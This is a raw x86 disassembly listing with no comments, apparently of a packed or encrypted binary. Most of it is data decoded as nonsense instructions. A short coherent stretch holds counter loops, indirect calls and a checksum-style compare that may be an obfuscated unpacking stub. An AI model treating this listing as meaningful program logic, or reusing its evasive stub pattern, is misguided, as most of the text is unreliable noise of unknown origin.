  4095cd:	ds sbb eax,0xac00770b
  4095d3:	jns    0x409641
  4095d5:	fnstcw WORD PTR [esi+0x7e]
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	pop    ebx
  4095dd:	xor    al,0x85
  4095df:	mov    bh,0x98
  4095e1:	fcomp  st(3)
  4095e3:	mov    esi,0x84751953
  4095e8:	mov    ebp,0xc00deb9
  4095ed:	out    dx,al
  4095ee:	dec    ecx
  4095ef:	addr16 aad 0xfe
  4095f2:	mov    dl,BYTE PTR [edx+0x4e1feefa]
  4095f8:	dec    eax
  4095f9:	cmp    DWORD PTR [edx+0x61],ebp
  4095fc:	ror    DWORD PTR [esi],0x65
  4095ff:	sub    ch,BYTE PTR [edx+0x17ad4e50]
  409605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409606:	adc    BYTE PTR [eax+ebx*2],al
  409609:	sub    al,0x12
  40960b:	mov    ebp,0x895b694b
  409610:	lea    edx,[edi]
  409612:	xor    al,0xc8
  409614:	sbb    al,0xee
  409616:	sub    al,0x7a
  409618:	xchg   DWORD PTR [eax+ebx*1+0x795f628a],eax
  40961f:	or     ebx,DWORD PTR [ebx-0x13e21744]
  409625:	(bad)  
  409626:	lods   al,BYTE PTR ds:[esi]
  409627:	or     DWORD PTR ds:0x42a0f177,edi
  40962d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40962e:	jp     0x409685
  409630:	jbe    0x40967c
  409632:	mov    bl,BYTE PTR [esi]
  409634:	rcl    DWORD PTR [eax],0xe9
  409637:	adc    esi,ebx
  409639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40963a:	nop
  40963b:	sbb    ch,BYTE PTR [eax+0x63078e3c]
  409641:	mov    bl,0x8e
  409643:	inc    eax
  409644:	outs   dx,DWORD PTR ds:[esi]
  409645:	and    eax,edi
  409647:	inc    edi
  409648:	jecxz  0x40960a
  40964a:	or     eax,0x8e4e79ed
  40964f:	out    0xc9,al
  409651:	xor    esi,DWORD PTR [esi+0x6b]
  409654:	add    edi,DWORD PTR [edi+0x7]
  409657:	or     DWORD PTR [edi-0x45],edi
  40965a:	cwde   
  40965b:	pop    ss
  40965c:	or     DWORD PTR [edi],esi
  40965e:	iret   
  40965f:	loope  0x409653
  409661:	sub    esi,DWORD PTR [ebx+edx*2+0x76e1b25]
  409668:	xchg   BYTE PTR [ebx+0x73],dl
  40966b:	(bad)  
  40966c:	fdivr  st(3),st
  40966e:	jbe    0x40969e
  409670:	add    eax,0x487f2aab
  409675:	dec    ch
  409677:	fcomp  DWORD PTR [edi+0x50d28c20]
  40967d:	sahf   
  40967e:	sbb    al,0x15
  409680:	inc    ecx
  409681:	sar    DWORD PTR [edx],cl
  409683:	jecxz  0x40966a
  409685:	jne    0x409691
  409687:	js     0x40965b
  409689:	mov    edx,edi
  40968b:	retf   0x2a06
  40968e:	mov    eax,0x123baa3d
  409693:	iret   
  409694:	dec    ecx
  409695:	or     eax,0xf2804154
  40969a:	xchg   edi,eax
  40969b:	sbb    ebp,edx
  40969d:	pop    ebp
  40969e:	(bad)  
  40969f:	sbb    eax,0x7cc54612
  4096a4:	xchg   DWORD PTR [edi+0x7e],ebp
  4096a7:	push   0x4c5370ff
  4096ac:	mov    dl,0xcb
  4096ae:	cmp    ax,0x3529
  4096b2:	sti    
  4096b3:	jge    0x4096a8
  4096b5:	retf   
  4096b6:	loopne 0x4096f5
  4096b8:	mov    eax,ds:0x990eb7f0
  4096bd:	rol    BYTE PTR [ebx+esi*8-0x65],0xf6
  4096c2:	push   cs
  4096c3:	mov    dh,0xdd
  4096c5:	loope  0x40972a
  4096c7:	ret    
  4096c8:	nop
  4096c9:	scas   al,BYTE PTR es:[edi]
  4096ca:	(bad)  
  4096cc:	or     BYTE PTR [eax-0x6d34bdc2],0x49
  4096d3:	pusha  
  4096d4:	adc    bl,BYTE PTR [ebx-0x4c9d3093]
  4096da:	scas   eax,DWORD PTR es:[edi]
  4096db:	mov    ah,0x24
  4096dd:	ins    BYTE PTR es:[edi],dx
  4096de:	jae    0x40975b
  4096e0:	lods   eax,DWORD PTR ds:[esi]
  4096e1:	jecxz  0x409761
  4096e3:	mov    dh,0xd
  4096e5:	xchg   ebp,eax
  4096e6:	ret    0x44fc
  4096e9:	add    ebp,DWORD PTR [edx+eax*8-0x5d]
  4096ed:	into   
  4096ee:	stc    
  4096ef:	inc    ebp
  4096f0:	push   ecx
  4096f1:	add    al,0x52
  4096f3:	sub    ch,ah
  4096f5:	aaa    
  4096f6:	xchg   edi,eax
  4096f7:	pop    edi
  4096f8:	test   DWORD PTR [ebx+0x41],0xe9c24beb
  4096ff:	aad    0xc8
  409701:	retf   0x366b
  409704:	pop    esp
  409705:	push   edi
  409706:	fadd   QWORD PTR [edx]
  409708:	retf   
  409709:	push   ds
  40970a:	loopne 0x4096f2
  40970c:	mov    edx,eax
  40970e:	jp     0x40971b
  409710:	ins    BYTE PTR es:[edi],dx
  409711:	add    cl,dl
  409713:	push   ecx
  409714:	adc    ecx,DWORD PTR [edi]
  409716:	xchg   ebx,eax
  409717:	sub    dh,BYTE PTR [ebx+0x8]
  40971a:	sub    eax,0xdc8d10fa
  40971f:	call   0x2615a97e
  409724:	ret    0x5a77
  409727:	or     BYTE PTR [edi-0x44],bl
  40972a:	(bad)  
  40972b:	xchg   edi,eax
  40972c:	inc    ebx
  40972d:	or     DWORD PTR [edi-0x383fe262],edx
  409733:	fcmovbe st,st(3)
  409735:	cmp    DWORD PTR [esi+0x75],edi
  409738:	mov    edx,gs
  40973a:	jnp    0x409728
  40973c:	jne    0x409766
  40973e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40973f:	adc    edx,ebx
  409741:	sub    BYTE PTR [edx],ah
  409743:	int3   
  409744:	lds    ebx,FWORD PTR [eax-0x31]
  409747:	arpl   WORD PTR [esi+0x6d70ee57],bx
  40974d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40974e:	data16 stc 
  409750:	pop    ds
  409751:	mov    WORD PTR [eax-0x573cfa60],ss
  409757:	data16 jae 0x40971f
  40975a:	aaa    
  40975b:	adc    BYTE PTR [edi],al
  40975d:	adc    al,0x24
  40975f:	mov    edi,0xacbd72e7
  409764:	pop    ds
  409765:	mov    al,0x6f
  409767:	ja     0x40975f
  409769:	xchg   DWORD PTR [edx+eax*2-0x37],edx
  40976d:	or     al,0xa8
  40976f:	mov    ah,0x6f
  409771:	adc    DWORD PTR [eax+0x6d2353a5],0x23c4e42b
  40977b:	add    cl,BYTE PTR [edi+eiz*4]
  40977e:	cdq    
  40977f:	push   es
  409780:	test   al,0x83
  409783:	inc    esi
  409784:	pop    esi
  409785:	das    
  409786:	into   
  409787:	outs   dx,BYTE PTR ds:[esi]
  409788:	cmp    BYTE PTR [esp+edx*2+0x167cb09d],ch
  40978f:	push   eax
  409790:	mov    edi,0x31f08511
  409795:	fcomp  DWORD PTR [edx]
  409797:	sub    bh,BYTE PTR [esi-0x693dce86]
  40979d:	or     edi,eax
  40979f:	fs es (bad) 
  4097a2:	xor    esi,DWORD PTR [ebx]
  4097a4:	pop    esp
  4097a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097a6:	inc    eax
  4097a7:	cmp    dh,BYTE PTR [esi-0x3b8fa7a]
  4097ad:	int    0x97
  4097af:	cwde   
  4097b0:	imul   ebx,edx,0x63641406
  4097b6:	jecxz  0x409738
  4097b8:	adc    DWORD PTR [edx],esi
  4097ba:	ins    BYTE PTR es:[edi],dx
  4097bb:	cmp    DWORD PTR [esi+ebp*1-0x36135435],esi
  4097c2:	out    0x93,al
  4097c4:	fnstcw WORD PTR [ecx+ebx*2+0x3a595f87]
  4097cb:	xchg   esp,eax
  4097cc:	les    ebp,FWORD PTR [eax+0x62]
  4097cf:	mov    ds,WORD PTR [ebx+0x3d]
  4097d2:	leave  
  4097d3:	inc    ecx
  4097d4:	imul   edi,DWORD PTR [ecx],0x382a3faf
  4097da:	ss std 
  4097dc:	ficomp WORD PTR [edi-0xf5b6066]
  4097e2:	popa   
  4097e3:	repnz mov ebx,0xaddf2c41
  4097e9:	sbb    BYTE PTR [ecx],bh
  4097eb:	icebp  
  4097ec:	mov    ebx,0xccbd6122
  4097f1:	sti    
  4097f2:	xchg   BYTE PTR [eax+0x4819e8db],ch
  4097f8:	lods   eax,DWORD PTR ds:[esi]
  4097f9:	or     eax,DWORD PTR [esi+0x24]
  4097fc:	sbb    dh,BYTE PTR [edi+ebx*8]
  4097ff:	fist   WORD PTR [ebx+0x76]
  409802:	arpl   WORD PTR [ebx],dx
  409804:	loopne 0x409828
  409806:	ret    0x4add
  409809:	mov    bh,ch
  40980b:	inc    edi
  40980c:	stc    
  40980d:	and    dl,ah
  40980f:	shl    DWORD PTR [ebx-0x35e7123c],1
  409815:	push   esp
  409816:	xor    ch,cl
  409818:	dec    DWORD PTR [ebx-0x45898dfc]
  40981e:	outs   dx,BYTE PTR ds:[esi]
  40981f:	adc    dh,BYTE PTR [ecx+0x4]
  409822:	fiadd  WORD PTR [eax-0x9]
  409825:	fisubr DWORD PTR [ebx]
  409827:	lods   eax,DWORD PTR ds:[esi]
  409828:	adc    ch,cl
  40982a:	mov    eax,ds:0xed53713a
  40982f:	jns    0x4097e1
  409831:	test   BYTE PTR [esi],cl
  409833:	mov    eax,ds:0x3cde508b
  409838:	int3   
  409839:	cmp    edx,edi
  40983b:	cmp    al,0xf6
  40983d:	ds xchg esi,ebx
  409840:	mov    dh,0xe1
  409842:	fcmovnbe st,st(7)
  409844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409845:	ds ret 
  409847:	and    bh,cl
  409849:	cmp    eax,0x2c04b1ed
  40984e:	sbb    DWORD PTR [eax+ebp*4+0x3f],edx
  409852:	and    al,al
  409854:	bound  ecx,QWORD PTR [edi-0x1d]
  409857:	push   edi
  409858:	mov    edi,0xb702bcb5
  40985d:	and    eax,0xe0fb8528
  409862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409863:	cli    
  409864:	ins    BYTE PTR es:[edi],dx
  409865:	mov    ds:0xc51a6cfb,al
  40986a:	adc    BYTE PTR [ebx],dh
  40986c:	pop    ss
  40986d:	sub    al,0x56
  40986f:	retf   
  409870:	add    eax,0xae3da248
  409875:	in     al,0x58
  409877:	push   ss
  409878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409879:	and    DWORD PTR es:[eax+0xb5022b],0x1725c1ac
  409884:	fidivr WORD PTR [eax-0x31cc491c]
  40988a:	fisub  DWORD PTR [edi+0x53]
  40988d:	pop    edx
  40988e:	xchg   dl,bh
  409890:	mov    ds:0xd1803847,eax
  409895:	ret    0x65e9
  409898:	leave  
  409899:	jmp    0x409839
  40989b:	imul   esp,DWORD PTR [ebx-0x18],0x401f774
  4098a2:	adc    cl,bl
  4098a4:	scas   eax,DWORD PTR es:[edi]
  4098a5:	imul   esi,eax,0xffffffd6
  4098a8:	pop    esp
  4098a9:	in     al,0xc7
  4098ab:	jle    0x4098bb
  4098ad:	mov    cs,WORD PTR [eax-0x1e]
  4098b0:	jmp    0x71ea:0x88cb7b63
  4098b7:	add    ebp,DWORD PTR [edi-0x57]
  4098ba:	dec    eax
  4098bb:	pop    ecx
  4098bc:	adc    eax,0x32629404
  4098c1:	cmp    DWORD PTR [ebx],0xffffff97
  4098c4:	out    dx,eax
  4098c5:	clc    
  4098c6:	je     0x4098e7
  4098c8:	enter  0x730c,0xf3
  4098cc:	enter  0xa56b,0xf5
  4098d0:	je     0x409862
  4098d2:	das    
  4098d3:	lea    edi,[ebx-0x22d2e5aa]
  4098d9:	addr16 pop ebp
  4098db:	jae    0x409914
  4098dd:	sub    edx,DWORD PTR [esi-0x3648f06d]
  4098e3:	sbb    DWORD PTR ds:0x43383b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4337a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fnstsw WORD PTR [esi+0x688368d1]
  4099c2:	in     al,0x7e
  4099c4:	jle    0x409a40
  4099c6:	jge    0x409a46
  4099c8:	jle    0x4099df
  4099ca:	cli    
  4099cb:	test   BYTE PTR [ecx-0x29],dh
  4099ce:	sub    BYTE PTR [ebp-0x78],0x78
  4099d2:	int3   
  4099d3:	or     BYTE PTR [eax],0xdb
  4099d6:	retf   0x8e7
  4099d9:	inc    edx
  4099da:	xor    ebp,DWORD PTR [edx-0x78]
  4099dd:	and    BYTE PTR [esi-0x33],0x8d
  4099e1:	ficom  WORD PTR [eax-0x747d535f]
  4099e7:	cmp    ecx,DWORD PTR [eax-0x35]
  4099ea:	inc    ecx
  4099eb:	ficom  WORD PTR [edi+0x5865d053]
  4099f1:	sbb    ah,bl
  4099f3:	popf   
  4099f4:	sub    eax,0x354eee6e
  4099f9:	push   es
  4099fa:	pusha  
  4099fb:	sti    
  4099fc:	into   
  4099fd:	popf   
  4099fe:	or     al,0x64
  409a00:	jnp    0x409a4b
  409a02:	dec    edx
  409a03:	cdq    
  409a04:	call   0x46aae53c
  409a09:	es in  eax,0xa9
  409a0c:	sbb    esi,esi
  409a0e:	shl    dl,cl
  409a10:	fstp   QWORD PTR [ecx]
  409a12:	out    0xdd,eax
  409a14:	sbb    BYTE PTR [esi],0xaa
  409a17:	lods   eax,DWORD PTR ds:[esi]
  409a18:	cmp    edx,DWORD PTR [eax]
  409a1a:	add    BYTE PTR [edi+0x5ef2a3cd],0x11
  409a21:	dec    esp
  409a22:	adc    BYTE PTR [ebx],ah
  409a24:	pushf  
  409a25:	sub    ebp,DWORD PTR [eax+0x6a]
  409a28:	cs xchg ebx,eax
  409a2a:	sub    BYTE PTR [ebp-0x3c6631a5],0x62
  409a31:	xor    BYTE PTR [eax],bh
  409a33:	scas   eax,DWORD PTR es:[edi]
  409a34:	lods   eax,DWORD PTR ds:[esi]
  409a35:	mov    WORD PTR [ecx-0x40853da2],?
  409a3b:	fistp  DWORD PTR ds:0x5328ca9b
  409a41:	es xchg ecx,eax
  409a43:	xchg   DWORD PTR [edi+eax*1+0x13],edi
  409a47:	into   
  409a48:	outs   dx,DWORD PTR ds:[esi]
  409a49:	xchg   ecx,eax
  409a4a:	and    ebx,edx
  409a4c:	jge    0x409aab
  409a4e:	mov    BYTE PTR [eax+eiz*1-0x4e],ch
  409a52:	jp     0x409a24
  409a54:	aaa    
  409a55:	fbld   TBYTE PTR [edi+0x1d253fee]
  409a5b:	nop
  409a5c:	push   ecx
  409a5d:	aad    0x9d
  409a5f:	(bad)  
  409a60:	xchg   edx,eax
  409a61:	xrelease mov DWORD PTR [ebx],ecx
  409a64:	xrelease xchg BYTE PTR [edi],dh
  409a67:	pop    edx
  409a68:	clc    
  409a69:	out    0xae,al
  409a6b:	stos   DWORD PTR es:[edi],eax
  409a6c:	xchg   BYTE PTR [edi],al
  409a6e:	aad    0x8d
  409a70:	stos   DWORD PTR es:[edi],eax
  409a71:	daa    
  409a72:	out    dx,al
  409a73:	adc    ebx,ebx
  409a75:	sar    ecx,1
  409a77:	jo     0x409adb
  409a79:	xchg   edx,eax
  409a7a:	pop    esp
  409a7b:	neg    DWORD PTR [ebx+0x62842a6e]
  409a81:	jecxz  0x409a98
  409a83:	data16 sub al,al
  409a86:	mov    esp,0x291ef862
  409a8b:	icebp  
  409a8c:	dec    ecx
  409a8d:	cmc    
  409a8e:	mov    esi,0xcfa79684
  409a93:	and    cl,BYTE PTR [edi]
  409a95:	nop
  409a96:	xor    al,0xf8
  409a98:	mov    WORD PTR [esi],cs
  409a9a:	add    eax,DWORD PTR [esi-0x7494d641]
  409aa0:	push   ecx
  409aa1:	(bad)  
  409aa2:	jne    0x409af3
  409aa4:	fdiv   QWORD PTR [edx-0x21]
  409aa7:	adc    edi,DWORD PTR [edx-0x5e]
  409aaa:	jmp    0x409a48
  409aac:	sti    
  409aad:	daa    
  409aae:	mov    edx,0xaaca56c9
  409ab3:	jae    0x409b28
  409ab5:	jge    0x409b02
  409ab7:	test   al,0xa3
  409ab9:	push   esi
  409aba:	cmp    eax,0xad71b14
  409abf:	pop    edx
  409ac0:	xchg   cl,al
  409ac2:	push   edi
  409ac3:	mov    ah,0x48
  409ac5:	call   0x1b862db9
  409aca:	push   edi
  409acb:	cld    
  409acc:	les    edx,FWORD PTR [eax]
  409ace:	sub    dl,0xf5
  409ad1:	and    dh,0xa9
  409ad4:	or     cl,BYTE PTR [eax-0x53]
  409ad7:	fndisi(8087 only) 
  409ad9:	sub    al,0xd2
  409adb:	fldl2e 
  409add:	push   esp
  409ade:	inc    esi
  409adf:	scas   al,BYTE PTR es:[edi]
  409ae0:	imul   esp,DWORD PTR [edx+esi*1],0x4c
  409ae4:	xor    esp,0xffffffbb
  409ae7:	and    DWORD PTR [ebp+0x6f],0x718015ef
  409aee:	mov    dh,0xe3
  409af0:	push   edx
  409af1:	pop    esi
  409af2:	loope  0x409b2c
  409af4:	mov    bl,0xf7
  409af6:	jmp    DWORD PTR [ebp-0x2a]
  409af9:	push   eax
  409afa:	push   ebx
  409afb:	mov    gs:0x1030f15,eax
  409b01:	rcl    dl,0x4d
  409b04:	gs pop es
  409b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b07:	pop    ds
  409b08:	cli    
  409b09:	(bad)  
  409b0a:	enter  0xf60d,0x98
  409b0e:	and    bl,BYTE PTR [edx]
  409b10:	mov    eax,0x952d37fe
  409b15:	popa   
  409b16:	mov    eax,ds:0xa7c0602f
  409b1b:	mov    esi,0xa0a044ed
  409b20:	ss jmp 0xd6fb:0x363c330a
  409b28:	xor    BYTE PTR [esi+0x7c],ah
  409b2b:	mov    ds:0xc95308b3,eax
  409b30:	dec    edi
  409b31:	mov    bh,0x7d
  409b33:	ret    
  409b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b35:	mov    ecx,0xd724f7fc
  409b3a:	mov    edx,0xef7ebba6
  409b3f:	in     al,dx
  409b40:	scas   eax,DWORD PTR es:[edi]
  409b41:	jl     0x409b5f
  409b43:	int    0xde
  409b45:	adc    eax,0x9d758f35
  409b4a:	inc    edi
  409b4b:	pop    edx
  409b4c:	in     al,0x8e
  409b4e:	iret   
  409b4f:	and    eax,0x40395d2b
  409b54:	es xchg esi,eax
  409b56:	loop   0x409b21
  409b58:	mov    WORD PTR ds:0x76004a01,gs
  409b5e:	mov    bl,0x8
  409b60:	inc    ebp
  409b61:	xor    DWORD PTR [ebx+0x3979a05],esp
  409b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b68:	icebp  
  409b69:	push   edx
  409b6a:	(bad)  
  409b6b:	in     eax,0x82
  409b6d:	sbb    bh,ah
  409b6f:	xor    DWORD PTR [ebp+0x3e0df73a],edx
  409b75:	add    BYTE PTR [esp+eiz*4],0xe8
  409b79:	stos   BYTE PTR es:[edi],al
  409b7a:	shl    BYTE PTR [esi+0x45f602],0xcb
  409b81:	ficomp WORD PTR [eax+0x5d]
  409b84:	std    
  409b85:	hlt    
  409b86:	jg     0x409b6a
  409b88:	ins    DWORD PTR es:[edi],dx
  409b89:	mov    eax,ds:0x843d1d55
  409b8e:	jo     0x409ba7
  409b90:	push   esp
  409b91:	fs retf 
  409b93:	push   edx
  409b94:	loope  0x409b68
  409b96:	inc    edx
  409b97:	dec    eax
  409b98:	pop    edx
  409b99:	test   cl,al
  409b9b:	push   ebp
  409b9c:	mov    ch,0x39
  409b9e:	mov    ?,WORD PTR [esi]
  409ba0:	sub    eax,0x94c8dc01
  409ba5:	push   edi
  409ba6:	fistp  WORD PTR [ecx+0x498933c9]
  409bac:	add    DWORD PTR [eax+0x563d3881],0xb0820f64
  409bb6:	mov    edx,DWORD PTR [eax+0x5c]
  409bb9:	stc    
  409bba:	in     eax,dx
  409bbb:	push   es
  409bbc:	sbb    esp,DWORD PTR [edx-0x61d1ff42]
  409bc2:	inc    ebp
  409bc3:	inc    ecx
  409bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc5:	data16 adc al,0x11
  409bc8:	(bad)  
  409bc9:	out    0x10,eax
  409bcb:	ds cld 
  409bcd:	inc    esi
  409bce:	dec    eax
  409bcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bd0:	cli    
  409bd1:	dec    dx
  409bd3:	and    eax,0xa9e88f85
  409bd8:	int3   
  409bd9:	inc    esp
  409bda:	les    ebp,FWORD PTR [ebp-0x19db6e84]
  409be0:	and    edi,DWORD PTR [ebp+esi*8-0x7dc160ea]
  409be7:	cmc    
  409be8:	enter  0x4453,0xbc
  409bec:	sub    BYTE PTR [ecx+0x42ba8e3e],0x37
  409bf3:	nop
  409bf4:	cmp    al,0x8a
  409bf6:	test   al,0x8
  409bf8:	scas   eax,DWORD PTR es:[edi]
  409bf9:	jmp    0x5d08:0x932f388c
  409c00:	pop    ecx
  409c01:	dec    esp
  409c02:	rcr    DWORD PTR [ecx+eax*1],1
  409c05:	pop    es
  409c06:	fld    DWORD PTR [ebp-0x12]
  409c09:	lods   al,BYTE PTR ds:[esi]
  409c0a:	jecxz  0x409c70
  409c0c:	push   ebx
  409c0d:	icebp  
  409c0e:	fcmovnu st,st(3)
  409c10:	inc    edx
  409c11:	rcl    DWORD PTR [eax+0x7a],1
  409c14:	in     eax,dx
  409c15:	call   0x6a52358f
  409c1a:	mov    eax,0xbcea34f9
  409c1f:	pop    esp
  409c20:	pop    edx
  409c21:	mov    ecx,0x1c6ad1ac
  409c26:	outs   dx,BYTE PTR ds:[esi]
  409c27:	push   ebx
  409c28:	jmp    0x409ca2
  409c2a:	les    ebp,FWORD PTR [eax]
  409c2c:	xlat   BYTE PTR ds:[ebx]
  409c2d:	ret    0xf709
  409c30:	xor    DWORD PTR [ecx-0x4f94cea2],edi
  409c36:	lock jbe 0x409be4
  409c39:	jb     0x409bfd
  409c3b:	jns    0x409bec
  409c3d:	cmp    DWORD PTR [edi-0x1e5264f1],0x37
  409c44:	mov    eax,ds:0xf77b5ddc
  409c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c4a:	jmp    0x4e21:0x8bf46c46
  409c51:	xor    eax,0x7de1c567
  409c56:	pop    es
  409c57:	div    BYTE PTR [ecx-0x7eb42b54]
  409c5d:	adc    BYTE PTR ds:0x2353ae89,ah
  409c63:	ja     0x409ca0
  409c65:	inc    ebx
  409c66:	xchg   edi,eax
  409c67:	lds    esp,FWORD PTR [edi+0x274a440a]
  409c6d:	dec    ebp
  409c6e:	inc    eax
  409c6f:	dec    edx
  409c70:	stos   BYTE PTR es:[edi],al
  409c71:	call   0xa265b139
  409c76:	inc    edx
  409c77:	sti    
  409c78:	fbld   TBYTE PTR [eax]
  409c7a:	je     0x409c60
  409c7c:	push   0xffffffa3
  409c7e:	das    
  409c7f:	adc    BYTE PTR [edi-0x1],dh
  409c82:	mov    edx,0xd926077f
  409c87:	shl    BYTE PTR ds:0x863199a6,0x5d
  409c8e:	bound  eax,QWORD PTR [esi-0x6f]
  409c91:	jb     0x409c2a
  409c93:	adc    ebp,DWORD PTR [eax-0x74]
  409c96:	cdq    
  409c97:	cs xor dl,0xfe
  409c9b:	int    0x39
  409c9d:	mov    bh,0xa9
  409c9f:	ret    
  409ca0:	js     0x409ccd
  409ca2:	xor    dl,cl
  409ca4:	adc    edi,DWORD PTR [esi]
  409ca6:	and    ch,BYTE PTR [esp+ebx*2-0xd]
  409caa:	cmc    
  409cab:	ret    0x8c2
  409cae:	pop    eax
  409caf:	ss loopne 0x409c7f
  409cb2:	sahf   
  409cb3:	test   eax,0xfad52841
  409cb8:	cmp    al,0x1b
  409cba:	push   edi
  409cbb:	sbb    cl,al
  409cbd:	sbb    al,0xaa
  409cbf:	add    BYTE PTR [edx-0x4849d58a],0x58
  409cc6:	(bad)  
  409cc7:	jb     0x409c67
  409cc9:	scas   eax,DWORD PTR es:[edi]
  409cca:	xor    BYTE PTR [edx-0x5d],dh
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	cmp    eax,0x7419d189
  409cfe:	jecxz  0x409d7e
  409d00:	jle    0x409d7c
  409d02:	jge    0x409d82
  409d04:	jle    0x409cfe
  409d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d07:	mov    edi,0x358da7f5
  409d0c:	sti    
  409d0d:	les    ebp,FWORD PTR [eax+0x24]
  409d10:	sub    bl,BYTE PTR [edi+0x6665c9bd]
  409d16:	pop    edi
  409d17:	mov    es,WORD PTR [esi+0x4b6c6914]
  409d1d:	fwait
  409d1e:	cmp    eax,0xb2369cbd
  409d24:	shr    DWORD PTR [eax+0x16203225],0xe5
  409d2b:	lds    edi,FWORD PTR [edx]
  409d2d:	xchg   ecx,eax
  409d2e:	push   ss
  409d2f:	rol    DWORD PTR ds:0xa861e377,cl
  409d35:	in     eax,dx
  409d36:	repz dec esp
  409d38:	mov    edi,0x5898ff67
  409d3d:	jmp    0xef77:0xa8808dc9
  409d44:	pop    ebx
  409d45:	mov    fs,WORD PTR [edi+0x36a13d25]
  409d4b:	cdq    
  409d4c:	xchg   edi,eax
  409d4d:	cmp    eax,0x6823902b
  409d52:	add    al,0x95
  409d54:	mov    bh,0x90
  409d56:	ret    
  409d57:	push   es
  409d58:	mov    al,ds:0xd55ab87f
  409d5d:	jns    0x409d42
  409d5f:	adc    edx,DWORD PTR fs:[edi]
  409d62:	xchg   DWORD PTR [ebx],edi
  409d64:	or     BYTE PTR es:[ecx-0x7cdc1fb3],0xf9
  409d6c:	push   ebp
  409d6d:	int3   
  409d6e:	pop    eax
  409d6f:	hlt    
  409d70:	cmp    al,0x1b
  409d72:	xor    DWORD PTR [esi],eax
  409d74:	cmp    al,0xd3
  409d76:	xchg   ebp,eax
  409d77:	jns    0x409de7
  409d79:	jns    0x409da8
  409d7b:	add    edx,ecx
  409d7d:	bound  edi,QWORD PTR [edi+0x6b]
  409d80:	cwde   
  409d81:	fld    QWORD PTR [eax+0x0]
  409d84:	neg    ebx
  409d86:	xor    DWORD PTR [ebx],edi
  409d88:	push   DWORD PTR [esp+esi*1-0x8]
  409d8c:	jb     0x409dc8
  409d8e:	pop    edx
  409d8f:	rcr    BYTE PTR [edi-0x5f3bee05],0x43
  409d96:	and    BYTE PTR [eax],dh
  409d98:	retf   0xf2cf
  409d9b:	jne    0x409dfa
  409d9d:	pusha  
  409d9e:	out    0xf5,eax
  409da0:	push   edx
  409da1:	inc    ebx
  409da2:	mov    es,ebx
  409da4:	call   0x671c2ed6
  409da9:	xchg   edi,eax
  409daa:	jbe    0x409d3e
  409dac:	js     0x409dbc
  409dae:	mov    al,0x8
  409db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409db1:	arpl   WORD PTR [esi-0x5c9ac9ca],si
  409db7:	push   edx
  409db8:	in     eax,0xeb
  409dba:	sub    bl,BYTE PTR [edx-0x21]
  409dbd:	imul   esi,DWORD PTR [ecx+0x5399acaf],0x3ae5e994
  409dc7:	inc    ebx
  409dc8:	mov    al,ds:0x2c574883
  409dcd:	into   
  409dce:	pop    es
  409dcf:	inc    ecx
  409dd0:	in     eax,0x6e
  409dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd3:	mov    ecx,0x36294939
  409dd8:	lods   al,BYTE PTR ds:[esi]
